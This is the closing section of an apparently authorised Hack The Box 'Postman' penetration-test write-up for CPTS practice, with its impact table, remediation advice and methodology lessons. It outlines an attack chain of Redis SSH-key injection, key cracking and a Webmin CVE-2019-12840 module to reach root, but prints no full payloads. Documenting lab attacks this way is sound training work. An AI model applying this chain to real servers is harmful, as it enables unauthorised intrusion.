```

On the authorized HTB lab, after preserving proof and ensuring another route exists, remove only your **known temporary files/keys** while avoiding deletion of pre-existing authorization data. Do not blindly `rm authorized_keys` if it might have legitimate entries or if this remains the sole foothold. If the original file was overwritten, removal cannot reconstruct it; restore a known-good version from a backup where available.

---

## Impact

SSH as redis, account transition to Matt and reading /root/root.txt through a Webmin exploitation shell were verified; a separate uid=0 command was not captured in the final shell.

### Final Engagement Assessment

| Objective | Result |
|---|---|
| Identify exposed services | **Completed** |
| Confirm Redis unauthenticated access | **Completed** |
| Validate Redis filesystem write | **Completed** |
| Obtain initial shell as `redis` | **Completed - UID 107 observed** |
| Find and crack an encrypted credential | **Completed - `[REDACTED]` recovered** |
| Transition to Matt | **Completed - Matt shell observed** |
| Authenticate to Webmin | **Completed** |
| Obtain privileged command shell through Webmin | **Command shell opened by privileged exploit module** |
| Read `/root/root.txt` | **Completed** |
| Record `uid=0(root)` in final shell | **Not captured in transcript** |
| Read user flag | **Not shown in transcript** |

**Root flag (HTB lab):**

```text
[REDACTED_HEX]
```

**Conclusion:** The machine's final objective was achieved through a reproducible, evidence-led chain: unauthenticated Redis → SSH key injection → encrypted key recovery → local user transition → authenticated Webmin CVE-2019-12840 → root flag. The strongest lesson was not a single exploit command, but the practice of choosing **the next step based on verified access and capabilities**.

---

## Remediation

The defensive recommendations and operational lessons below address the demonstrated weaknesses. They follow the original source material instead of inferring additional compromise.

### Remediation and Defensive Recommendations

#### Redis exposure

**Finding:** Unauthenticated Redis reachable over the lab network with protected mode disabled.

**Recommended controls:**

- Bind Redis to trusted interfaces only; block TCP/6379 at the host or network boundary unless strictly required.
- Enable appropriate Redis authentication/ACLs for the installed version and restrict administrative commands.
- Do not run Redis under an unnecessarily privileged account.
- Limit filesystem permissions so the service cannot write trust/configuration files not needed for its function.
- Monitor attempts to modify `dir`/`dbfilename`, suspicious `SAVE` operations, and `.ssh/authorized_keys` modifications.

#### SSH public-key trust

**Finding:** Redis could create a database snapshot inside its SSH authorization directory, and OpenSSH accepted a parseable embedded key line.

**Recommended controls:**

- Avoid unnecessary interactive shells and SSH authorization paths for service identities.
- Protect `.ssh` directories and authorized key files against unauthorized modification.
- Track unexpected changes to authorized key files; investigate keys that cannot be attributed to an approved administrator.
- Treat exposed service-account home directories as part of the security boundary.

#### Secret storage

**Finding:** An encrypted private key in `/opt` was owned by Matt but world-readable, and its passphrase was easily recovered.

**Recommended controls:**

- Protect private keys with restrictive filesystem permissions (`0600` or tighter as applicable).
- Never store unnecessary private-key backups in generally readable directories.
- Use strong, unique passphrases resistant to dictionary cracking.
- Rotate exposed key material and any reused passwords, even where the stored key is encrypted.

#### Webmin

**Finding:** Webmin 1.910 exposed an authenticated Package Updates command-execution path.

**Recommended controls:**

- Upgrade Webmin to a current patched release.
- Restrict the Webmin management port to administrative networks/VPNs.
- Enforce least-privilege Webmin module authorization; avoid granting nonadministrators access to privileged Package Updates functionality.
- Use separate administrative credentials, auditing, and strong authentication controls.
- Monitor unexpected shell processes spawned by Webmin/MiniServ or package-management helpers.

---

### CPTS Methodology Lessons

1. **Prove primitives in stages.** `CONFIG SET` → harmless `SAVE` → `.ssh` write test → SSH authentication; each stage answers a different question.
2. **Don't abandon an empty data service.** Redis had no keys to steal but was still capable of producing a useful filesystem artifact.
3. **Treat shell history as a map of probable relationships.** Repeated `su Matt` plus `id_rsa.bak` directed enumeration toward the correct identity and file.
4. **Separate authorization boundaries.** `DenyUsers Matt` restricted SSH, not local `su` or Webmin PAM authentication.
5. **Use long enough password attacks, but stay evidence-led.** One targeted John run with RockYou succeeded; escalation to stronger cracking strategies would only have been needed if that failed.
6. **Don't overvalue automated CVE lists.** LinPEAS candidates were not tested successfully, whereas the Webmin application/privilege path had direct evidence.
7. **A failed exploit is a result, not an invitation to force it.** CVE-2019-15107 was rejected; the alternative CVE-2019-12840 module succeeded.
8. **Distinguish similarly named modules.** `webmin_packageup_rce` (2019) and `webmin_package_updates_rce` (2022) are not interchangeable in technical reporting.
9. **Record privilege proof at each transition.** `redis` UID 107 was captured; Matt account access was observed; for the final shell, add `id` and `whoami` next time, even after reading the root flag.
10. **Keep credential provenance and cleanup notes.** Log where secrets came from, which tests modified filesystem state, and whether service configuration was fully restored.

#### Competencies practised

| CPTS domain | Practised during Postman |
|---|---|
| Network enumeration | Full TCP scan, version/script scan, HTTP fingerprinting |
| Service exploitation | Unauthenticated Redis administrative features, RDB persistence |
| Linux foothold | SSH trust-file injection, command-line access verification |
| Local enumeration | Users, histories, permissions, processes, services, SUID, cron |
| Password attacks | `ssh2john`, wordlist cracking of an encrypted RSA key |
| Lateral movement | Service account → regular user using local authentication |
| Web exploitation | Authentication testing and targeted Webmin CVE selection |
| Privilege escalation | Authenticated privileged management application command execution |
| Reporting | Evidence capture, failed paths, reproducibility, impact, remediation |

---

### External Technical References (Background Only)

These are documentation and advisory references, **not a published machine walkthrough**. The engagement chain above was reconstructed from the provided scan output, terminal commands, screenshots, and LinPEAS logs.

1. [Redis - Persistence and RDB snapshots](https://redis.io/docs/latest/management/persistence/)
2. [Rapid7 - Webmin Package Updates RCE (`webmin_packageup_rce`)](https://www.rapid7.com/db/modules/exploit/linux/http/webmin_packageup_rce/)
3. [Rapid7 Metasploit module documentation - Webmin 1.910 Package Updates](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/linux/http/webmin_packageup_rce.md)
4. [INCIBE - CVE-2019-12840](https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2019-12840)
5. [Rapid7 - Webmin password-change backdoor (`CVE-2019-15107`)](https://www.rapid7.com/db/modules/exploit/linux/http/webmin_backdoor/)

---

*Prepared for the CPTS Prep Boxes project. All actions described took place in an authorized HTB training environment. User-supplied evidence is distinguished from reconstructed command sequences; no undocumented flags, file contents, or exploit results have been fabricated.*
